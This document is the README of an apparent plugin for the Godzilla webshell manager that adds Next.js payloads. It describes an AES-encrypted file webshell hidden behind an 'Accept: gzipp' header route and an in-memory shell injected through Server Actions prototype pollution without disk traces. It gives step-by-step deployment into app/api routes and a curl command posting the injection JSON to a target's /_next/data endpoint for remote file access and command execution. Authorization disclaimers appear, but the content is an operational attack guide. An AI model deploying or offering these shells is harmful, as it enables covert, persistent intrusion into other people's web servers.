# Next.js Payload for Godzilla

[![Java](https://img.shields.io/badge/Java-8+-orange.svg)](https://www.oracle.com/java/)
[![Maven](https://img.shields.io/badge/Maven-3.6+-blue.svg)](https://maven.apache.org/)
[![Godzilla](https://img.shields.io/badge/Godzilla-4.01-green.svg)](https://github.com/BeichenDream/Godzilla)

为 Godzilla 平台提供 Next.js 框架支持的 Payload 和加密器插件。

## 📋 目录

- [项目简介](#项目简介)
- [功能特性](#功能特性)
- [环境要求](#环境要求)
- [快速开始](#快速开始)
- [使用指南](#使用指南)
- [项目结构](#项目结构)
- [构建说明](#构建说明)
- [安全声明](#安全声明)
- [贡献指南](#贡献指南)

## 项目简介

本项目是一个基于 Java + Maven 构建的 Godzilla 插件，专门为 Next.js 框架提供 Payload 和加密器支持。生成的 JAR 文件可直接作为插件加载到 Godzilla 客户端中使用。

**⚠️ 重要提示**：
- 本项目仅供安全研究、授权测试和教育用途。使用前请确保已获得目标系统的明确授权，任何未授权使用均属违法行为。
- **⚠️ 兼容性说明**：本插件**不兼容普通版哥斯拉**，仅适用于特定版本的 Godzilla 客户端（4.01 或更高版本）。

## 功能特性

### 🎯 Payload

- **nextjs-gzl**: Next.js 动态 Payload，支持完整的文件操作和命令执行功能

### 🔐 加密器

#### JS_AES_WEBSHELL
- **类型**: 文件型 Webshell
- **加密算法**: AES-128-CBC
- **部署方式**: Next.js API Routes
- **文件格式**: 支持 `.js` 和 `.ts` 两种格式
- **路由识别**: 基于 `Accept: gzipp` Header 的隐蔽路由

#### JS_AES_MEMSHELL
- **类型**: 内存马（Memory Shell）
- **加密算法**: AES-128-ECB
- **注入方式**: 通过 Next.js Server Actions 原型污染注入
- **特点**: 无需在磁盘上留下文件痕迹
- **自动生成**: 自动生成内存马注入 JSON 文件

### ✨ 核心优势

- ✅ 支持文件型 Webshell 和内存马两种模式
- ✅ 基于 Header 的隐蔽路由机制（`Accept: gzipp`）
- ✅ AES 加密通信，保障数据传输安全
- ✅ 自动生成内存马注入 JSON 配置
- ✅ 支持 TypeScript 和 JavaScript 两种文件格式
- ✅ 完整的文件操作和命令执行功能

## 环境要求

- **Java**: JDK 8 或更高版本
- **Maven**: 3.6 或更高版本
- **Godzilla**: （**不兼容普通版哥斯拉**）
- **操作系统**: Windows / Linux / macOS

## 快速开始

### 1. 克隆项目

```bash
git clone <repository-url>
cd nextjs-gzl
```

### 2. 构建插件

```bash
mvn clean package
```

构建完成后，插件 JAR 文件将位于 `target/NextJsPayload-1.0-SNAPSHOT.jar`

### 3. 安装插件

1. 打开 Godzilla 客户端
2. 进入 **配置** → **插件配置**
3. 点击 **添加插件** 或 **上传插件**
4. 选择构建生成的 JAR 文件
5. 重启 Godzilla 客户端以加载插件

## 使用指南

### 生成 Webshell

#### 文件型 Webshell (JS_AES_WEBSHELL)

1. 在 Godzilla 中选择 **生成** → **Webshell**
2. 配置参数：
   - **Payload**: `nextjs-gzl`
   - **加密器**: `JS_AES_WEBSHELL`
   - **密码**: 自定义密码（用于加密通信）
   - **密钥**: 自定义密钥（AES 加密密钥）
   - **文件后缀**: 选择 `.js` 或 `.ts`
3. 点击 **生成**，将生成 `shell.js` 或 `shell.ts` 文件

#### 内存马 (JS_AES_MEMSHELL)

1. 在 Godzilla 中选择 **生成** → **Webshell**
2. 配置参数：
   - **Payload**: `nextjs-gzl`
   - **加密器**: `JS_AES_MEMSHELL`
   - **密码**: 自定义密码
   - **密钥**: 自定义密钥
   - **文件后缀**: 选择 `.js` 或 `.ts`
3. 点击 **生成**，将生成：
   - `shell.js` 或 `shell.ts`（可选，用于参考）
   - `nextjs_memshell_[password]_[timestamp].json`（内存马注入配置）

### 部署 Webshell

#### 文件型 Webshell 部署

1. **重命名文件**
   ```bash
   # 将生成的 shell.js 重命名为 route.js
   mv shell.js route.js
   # 或 TypeScript 版本
   mv shell.ts route.ts
   ```

2. **部署到 Next.js 项目**
   ```
   将 route.js/route.ts 放置到：
   app/api/[任意路由名称]/route.js
   或
   app/api/[任意路由名称]/route.ts
   ```

3. **重启 Next.js 服务**
   ```bash
   npm run dev
   # 或生产环境
   npm run build && npm start
   ```

4. **在 Godzilla 中连接**
   - **URL**: `http://target.com/api/[路由名称]`
   - **密码**: 生成时填写的密码
   - **密钥**: 生成时填写的密钥
   - **加密器**: `JS_AES_WEBSHELL`

#### 内存马注入

1. **定位 Server Actions 端点**
   - 通常位于 `/_next/data/` 路径
   - 或通过表单提交端点注入

2. **发送注入请求**
   ```bash
   curl -X POST http://target.com/_next/data/[build-id]/[page].json \
     -H "Content-Type: application/json" \
     -d @nextjs_memshell_[password]_[timestamp].json
   ```

   或使用其他 HTTP 客户端工具发送 POST 请求，Body 为 JSON 文件内容。

3. **在 Godzilla 中连接**
   - **URL**: `http://target.com/`（任意路径均可）
   - **密码**: 生成时填写的密码
   - **密钥**: 生成时填写的密钥
   - **加密器**: `JS_AES_MEMSHELL`

### 功能说明

生成的 Payload 支持以下功能：

- ✅ **文件操作**: 上传、下载、删除、移动、复制文件
- ✅ **目录操作**: 创建、删除、浏览目录
- ✅ **命令执行**: 执行系统命令并获取输出
- ✅ **基本信息**: 获取当前目录、系统信息等

## 项目结构

```
nextjs-gzl/
├── pom.xml                          # Maven 配置文件
├── README.md                        # 项目说明文档
└── src/
    └── main/
        ├── java/                    # Java 源代码
        │   └── shells/
        │       ├── payloads/        # Payload 实现
        │       │   └── nextjs/
        │       │       └── NextJsShell.java
        │       └── cryptions/       # 加密器实现
        │           └── jsAes/
        │               ├── Generate.java
        │               ├── JsAesWebshell.java
        │               └── JsAesMemShell.java
        └── resources/               # 资源文件
            └── shells/
                ├── payloads/
                │   └── nextjs/
                │       └── assets/
                │           └── payload.js
                └── cryptions/
                    └── jsAes/
                        └── template/
                            ├── shell.js
                            ├── shell.ts
                            ├── shellApi.js
                            ├── shellApi.ts
                            └── *.bin (编译后的模板文件)
```

## 构建说明

### 基本构建命令

```bash
# 清理并打包（推荐）
mvn clean package

# 仅编译（不打包）
mvn compile

# 跳过测试打包
mvn clean package -DskipTests

# 查看构建产物
ls -lh target/*.jar
```

### 构建产物

构建成功后，在 `target/` 目录下会生成：
- `NextJsPayload-1.0-SNAPSHOT.jar` - 插件 JAR 文件

### 开发调试

```bash
# 安装到本地 Maven 仓库
mvn clean install

# 查看依赖树
mvn dependency:tree
```

## 安全声明

1. **合法使用**: 本项目仅供安全研究、授权渗透测试和教育用途使用
2. **授权要求**: 使用前必须获得目标系统的明确书面授权
3. **责任声明**: 作者和维护者不对任何未授权或非法使用本工具导致的后果承担责任
4. **合规性**: 使用者需自行确保其使用行为符合当地法律法规

## 贡献指南

欢迎提交 Issue 和 Pull Request！

### 贡献流程

1. Fork 本仓库
2. 创建特性分支 (`git checkout -b feature/AmazingFeature`)
3. 提交更改 (`git commit -m 'Add some AmazingFeature'`)
4. 推送到分支 (`git push origin feature/AmazingFeature`)
5. 开启 Pull Request

### 代码规范

- 遵循 Java 编码规范
- 添加必要的注释和文档
- 确保代码通过编译和测试

## 许可证

请参考项目根目录的 LICENSE 文件（如有）。

## 相关链接

- [Godzilla 项目](https://github.com/BeichenDream/Godzilla)
- [Next.js 官方文档](https://nextjs.org/docs)

---

**再次提醒**: 请务必在合法合规的前提下使用本工具，任何未授权使用均属违法行为。
